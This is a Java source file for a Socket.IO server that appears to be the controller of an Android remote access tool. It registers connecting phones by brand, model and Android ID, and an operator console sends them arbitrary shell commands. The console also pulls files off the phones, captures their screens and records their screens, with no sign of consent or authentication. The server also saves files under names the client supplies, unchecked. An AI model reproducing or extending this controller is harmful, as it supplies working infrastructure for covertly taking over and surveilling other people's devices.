package com.ele.socketio.server;

import com.corundumstudio.socketio.*;
import com.corundumstudio.socketio.listener.ConnectListener;
import com.corundumstudio.socketio.listener.DataListener;
import com.corundumstudio.socketio.listener.DisconnectListener;
import com.corundumstudio.socketio.listener.PingListener;

import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class ConnectionServer {
    private final String INPUT_HINT = "";
    private Logger logger = LoggerFactory.getLogger(ConnectionServer.class.getCanonicalName());
    private Configuration mConfiguration;
    private SocketIOServer mServer;
    private ConcurrentHashMap<String, ClientInfo> mClients = new ConcurrentHashMap<>(); // did client&map
    private ConcurrentHashMap<String, FileOutputStream> mClientDldFouts = new ConcurrentHashMap<>();

    private volatile ClientInfo mCurrClient;


    public ConnectionServer() {
        initConfiguration();
        initServer();
    }

    private void initConfiguration() {
        mConfiguration = new Configuration();
        // 192.168.199.135
        //mConfiguration.setHostname("172.31.85.179");
        mConfiguration.setHostname("192.168.199.135");
//        mConfiguration.setHostname("192.168.199.169");
        mConfiguration.setPort(8080);
        mConfiguration.setPingInterval(15_000); // 15s
        mConfiguration.setPingTimeout(60_000); // 60s
        mConfiguration.setMaxFramePayloadLength(10 * 1024 * 1024);
        mConfiguration.setMaxHttpContentLength(10 * 1024 * 1024);
    }

    private void initServer() {
        mServer = new SocketIOServer(mConfiguration);
        mServer.addConnectListener(new ConnectListener() {
            @Override
            public void onConnect(SocketIOClient client) {
                logger.debug("client connected: {}", client.getRemoteAddress().toString());
                clientIncome(client);
            }
        });

        mServer.addPingListener(new PingListener() {
            @Override
            public void onPing(SocketIOClient client) {
                logger.debug("pong from {}", client.getRemoteAddress().toString());
                /*String did = client.getHandshakeData().getSingleUrlParam("did");
                if (!mClients.contains(did) || !mClients.get(did).getIOClient().equals(client)) {
                }*/
            }
        });

        mServer.addDisconnectListener(new DisconnectListener() {
            @Override
            public void onDisconnect(SocketIOClient client) {
                logger.debug("client disconnected: {} ", client.getRemoteAddress().toString());
                clientDisconnect(client);
            }
        });

        mServer.addEventListener("cmdr", String.class, new DataListener<String>() {
            @Override
            public void onData(SocketIOClient client, String data, AckRequest ackSender) {
                String did = getDidByClientSocket(client);
                if (mCurrClient != null && StringUtils.equals(mCurrClient.getDid(), did)) {
                    System.out.print(data);
                } else {
                    logger.info("omit cmdr {}: {}", did, data);
                }
            }
        });

        mServer.addEventListener("dldr", DldFileInfo.class, new DataListener<DldFileInfo>() {
            @Override
            public void onData(SocketIOClient client, DldFileInfo dldFileInfo, AckRequest ackSender) throws Exception {
                // System.out.println(dldFileInfo);
                String did = getDidByClientSocket(client);
                logger.info("receive file: {} {} size: {} bytes", did, dldFileInfo.getName(), dldFileInfo.getData().length);
                String fileName = dldFileInfo.getName();
                FileOutputStream fout = new FileOutputStream(fileName);
                fout.write(dldFileInfo.getData());
                fout.flush();
                fout.close();
                System.out.printf("receive file: %s %s size: %d bytes\n", did, fileName, dldFileInfo.getData().length);
            }
        });

        mServer.addEventListener("dldrt", DldFileInfo.class, new DataListener<DldFileInfo>() {
            @Override
            public void onData(SocketIOClient client, DldFileInfo dldFileInfo, AckRequest ackSender) throws Exception {
                String did = getDidByClientSocket(client);
                logger.info("receive file block: {} {} size: {} bytes", did, dldFileInfo.getName(), dldFileInfo.getData().length);
                FileOutputStream fout = mClientDldFouts.get(did);
                String fileName = dldFileInfo.getName();
                if (fout == null) {
                    fout = new FileOutputStream(fileName);
                    mClientDldFouts.put(did, fout);
                }
                fout.write(dldFileInfo.getData());
                fout.flush();
                if ("f".equals(dldFileInfo.getType())) { // 传输完成
                    fout.close();
                    mClientDldFouts.remove(did);
                    System.out.printf("receive file finished: %s %s\n", did, fileName);
                } else {
                    System.out.printf("receive file temp: %s %s\n", did, fileName);
                }
            }
        });
        mServer.addEventListener("sccr", DldFileInfo.class, new DataListener<DldFileInfo>() {
            @Override
            public void onData(SocketIOClient client, DldFileInfo dldFileInfo, AckRequest ackSender) throws Exception {
                String did = getDidByClientSocket(client);
                logger.info("receive scc: {}", did);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyymmddHHmmss");
                String fileName = did + "_" + sdf.format(new Date()) + ".png";
                FileOutputStream fout = new FileOutputStream(fileName);
                fout.write(dldFileInfo.getData());
                fout.flush();
                fout.close();
                System.out.printf("receive screencap: %s\n", did);
            }
        });
        mServer.addEventListener("srcr", DldFileInfo.class, new DataListener<DldFileInfo>() {
            @Override
            public void onData(SocketIOClient client, DldFileInfo dldFileInfo, AckRequest ackSender) throws Exception {
                String did = getDidByClientSocket(client);
                logger.info("receive src: {}", did);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyymmddHHmmss");
                String fileName = did + "_" + sdf.format(new Date()) + ".mp4";
                FileOutputStream fout = new FileOutputStream(fileName);
                fout.write(dldFileInfo.getData());
                fout.flush();
                fout.close();
                System.out.printf("receive screenRecord: %s\n", did);
            }
        });
    }
    // synchronized
    private void clientIncome(SocketIOClient client) {
        HandshakeData handshakeData = client.getHandshakeData();
        String ip = handshakeData.getAddress().getHostName();
        int port = handshakeData.getAddress().getPort();
        Map<String, List<String>> params = handshakeData.getUrlParams();
        String did = params.get("did").get(0);
        String brand = params.get("brand").get(0);
        String model = params.get("model").get(0);
        String release = params.get("release").get(0);
        String androidID = params.get("android_id").get(0);
        String manf = params.get("manf").get(0);
        ClientInfo clientInfo = new ClientInfo(client, ip, port, did, brand, model, release, manf, androidID);
        mClients.put(did, clientInfo);
    }
    // synchronized
    private void clientDisconnect(SocketIOClient client) {
        if (client.getHandshakeData() == null) {
            logger.error("invalid SocketIOClient, no handshakedata found!");
        } else {
            String did = client.getHandshakeData().getSingleUrlParam("did");
            if (StringUtils.isEmpty(did)) {
                logger.error("invalid handshakedata did is empty!");
            } else {
                mClients.remove(did);
                if (mCurrClient != null && mCurrClient.getDid().equals(did)) {
                    mCurrClient = null;
                }
            }
        }
    }

    public void start() {
        mServer.start();
    }

    public void interactive() {
        Scanner scanner = new Scanner(System.in);
        // System.out.print(mCurrClient == null ? "" : mCurrClient.getDid() + ">");
        while (true) {
            String newLine = scanner.nextLine();
            //System.out.println(newLine);
            if (StringUtils.isEmpty(newLine)) continue;
            String[] cmds = StringUtils.split(newLine, " ");
            if (mCurrClient == null) {
                switch (cmds[0]) {
                    case "":
                        String filePath = ".";
                        if (cmds.length >= 2) {
                            filePath = cmds[1];
                        }
                        File file = new File(filePath);
                        String[] fileNames = file.list();
                        for (String fileName : fileNames) {
                            System.out.println(fileName);
                        }
                        break;
                    case "la": // list all connected client
                        cmdListAllClients();
                        break;
                    case "cn":
                        if (cmds.length < 2) {
                            System.err.println("need did");
                        } else {
                            cmdConnectClient(cmds[1]);
                        }
                        break;
                    case "cr":
                        if (cmds.length < 3) {
                            System.err.println("need did and command to run");
                        } else {
                            String did = cmds[1];
                            String[] subCmds = ArrayUtils.subarray(cmds, 2, cmds.length);
                            ClientInfo client = mClients.get(did);
                            if (client == null) {
                                System.err.println("did is not online");
                            } else {
                                String subCmd = StringUtils.join(subCmds, ' ');
                                System.out.println("sub cmd is: " + subCmd);
                                client.getIOClient().sendEvent("cmd", subCmd);
                            }
                        }
                        break;
                    default:
                        System.err.println("invalid cmd");
                }
            } else {
                if ("ep".equals(cmds[0])) {
                    System.out.println("exit interact from client: " + mCurrClient.getDid());
                    mCurrClient = null;
                } else {
                    if ("dld".equals(cmds[0])) {
                        if (cmds.length < 2) {
                            System.err.println("need file");
                        } else {
                            String filePath = cmds[1];
                            mCurrClient.getIOClient().sendEvent("dld", filePath);
                        }
                    } else if ("scc".equals(cmds[0])) {
                        mCurrClient.getIOClient().sendEvent("scc", "");
                    } else if ("src".equals(cmds[0])) {
                        String time = "";
                        if (cmds.length >= 2) {
                            time = cmds[1];
                        }
                        mCurrClient.getIOClient().sendEvent("src", time);
                    } else {
                        mCurrClient.getIOClient().sendEvent("cmd", newLine);
                    }
                }
            }
            // System.out.print(mCurrClient == null ? "" : mCurrClient.getDid() + ">");
        }
    }

    private void cmdListAllClients() {
        for (ClientInfo clientInfo : mClients.values()) {
            System.out.printf("%s\t%s\t%d\t%s\t%s\t%s\t%s\t%s\n", clientInfo.getDid(), clientInfo.getIp(), clientInfo.getPort(), clientInfo.getBrand(), clientInfo.getModel(), clientInfo.getRelease(), clientInfo.getManf(), clientInfo.getAndroidID());
        }
    }

    private void cmdConnectClient(String did) {
        ClientInfo clientInfo = mClients.get(did);
        if (clientInfo == null) {
            System.err.println("invalid did");
            return;
        }
        mCurrClient = clientInfo;
        System.out.println("connected to client: " + clientInfo.getDid());
    }

    private String getDidByClientSocket(SocketIOClient client) {
        try {
            return client.getHandshakeData().getSingleUrlParam("did");
        } catch (Exception e) {
            return "";
        }
    }
}
